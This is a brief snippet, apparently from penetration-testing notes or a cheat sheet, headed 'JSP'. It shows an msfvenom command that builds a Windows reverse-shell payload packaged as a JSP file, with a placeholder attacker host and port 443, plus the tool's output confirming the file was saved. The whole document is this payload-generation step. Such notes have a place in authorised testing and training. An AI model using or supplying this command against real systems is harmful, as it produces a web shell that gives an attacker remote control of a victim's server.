# JSP

```text
$ msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER LPORT=443 -f jsp -o rshell-32.jsp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of jsp file: 149070 bytes
Saved as: rshell-32.jsp
```

